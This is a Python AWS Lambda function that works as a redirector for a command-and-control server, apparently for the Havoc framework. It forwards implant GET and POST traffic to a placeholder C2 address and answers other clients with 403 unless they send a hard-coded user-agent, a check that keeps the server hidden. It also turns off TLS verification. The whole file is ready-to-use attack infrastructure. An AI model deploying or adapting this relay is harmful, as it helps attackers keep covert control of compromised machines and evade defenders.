# this allows you to have the c2 server behind a lambda function
import base64
import os
import requests

def lambda_handler(event, context):

    # you need to allow inbound https on the c2 server from the aws subnet range that you have the lambda and ec2 instance on
    backendserver = "C2 SERVER IP"
    url = "https://" +backendserver + event["requestContext"]["http"]["path"]

    queryStrings = {}
    if "queryStringParameters" in event.keys():
        for key, value in event["queryStringParameters"].items():
            queryStrings[key] = value


    inboundHeaders = {}
    for key, value in event["headers"].items():
        if key.lower() == "host":
            inboundHeaders[key] = backendserver
        else:
            inboundHeaders[key] = value

    # this is so that only our useragent can access the c2 server
    if "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.63571.0 Safari/5997.36" not in inboundHeaders.values():
        return {
            "statusCode": 403,
            "body": "no"
        }

    body = ""
    if "body" in event.keys():
        if event["isBase64Encoded"]:
            body = base64.b64decode(event["body"])
        else:
            body = event["body"]


    requests.packages.urllib3.disable_warnings()

    if event["requestContext"]["http"]["method"] == "GET":
        #print("Request type: GET")

        #print(inboundHeaders)
        #print('--------------')
        #print(queryStrings)
        resp = requests.get(url, headers=inboundHeaders, params=queryStrings, verify=False)

    elif event["requestContext"]["http"]["method"] == "POST":
        #print("Request type: POST")
        #print(inboundHeaders)
        #print('--------------')
        #print(queryStrings)
        resp = requests.post(url, headers=inboundHeaders, params=queryStrings, data=body, verify=False)
    else:
        #print("Request type: " + event["requestContext"]["http"]["method"])
        lambda_response1 = {
            "statusCode": 405,
            "body": "no"
        }
        return lambda_response1

    resp.close()

    #print(resp.status_code)
    #print(resp.text)
    #print(resp.headers.items())
    #print('-----------------------------------')

    outboundHeaders = {}
    for head, val in resp.headers.items():
        outboundHeaders[head] = val

    #print(outboundHeaders)

    lambda_response = {
        "statusCode": resp.status_code,
        "headers": outboundHeaders,
        "body": base64.b64encode(resp.content).decode(), # this is super critical since havoc returns encrypted bytes in the body
        "isBase64Encoded": True
    }

    return lambda_response
